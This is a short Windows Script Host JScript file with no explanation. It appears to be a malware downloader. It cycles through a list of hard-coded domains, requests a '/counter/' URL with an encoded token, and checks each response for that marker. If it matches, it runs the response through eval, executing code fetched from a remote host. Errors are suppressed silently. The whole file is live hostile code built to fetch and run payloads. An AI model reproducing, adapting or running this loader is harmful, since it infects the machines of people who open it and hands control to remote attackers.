

var x = "str8endz.com bv.truecompassdesigns.net live2live.me online-web-typing.com delta.truecompassdesigns.net".split(" ");
var m = "0000001CKdDqiy24wSZz4qGunk4vxZ7XqM1f4zV1LXIF8ZAugNju4fJh6NMfHNi8ZIh2QU3-Bk0PKAwIfFa_YuD-Ib6IL_bomH19FZnWk51LG-0R8847bw";
for (var i=0; i<x.length; i++)
{
	var e = WScript.CreateObject("MSXML2.XMLHTTP");	
	try
	{
		var ter = '/';
		e.open('GET', 
		"http"+"://"+x[i]+ter+"c"+"ounter/?"+m,
		
		false);
		e.send();

		var r = e.responseText;

		if (r.length > 1000 && r.indexOf(m) > -1)
		{
			eval(e.responseText.split(m).join("a"));

			break;
		};
	}
	catch(e)
	{
	};
};